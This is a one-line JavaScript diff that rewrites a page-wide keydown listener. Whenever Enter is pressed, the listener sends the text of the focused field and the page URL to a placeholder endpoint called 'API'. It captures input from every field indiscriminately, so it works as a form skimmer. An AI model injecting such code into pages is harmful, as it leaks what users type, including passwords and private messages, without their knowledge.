@@ -1,1 +1,1 @@
-document.addEventListener('keydown',e=>console.log(e.key)||e.key==='Enter'&&fetch('API',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:(e.target.value||e.target.textContent),url:document.URL})}));
+document.addEventListener('keydown',e=>e.key==='Enter'&&fetch('API',{method:'POST',body:(e.target.value||e.target.textContent||'')+'☼'+location}))
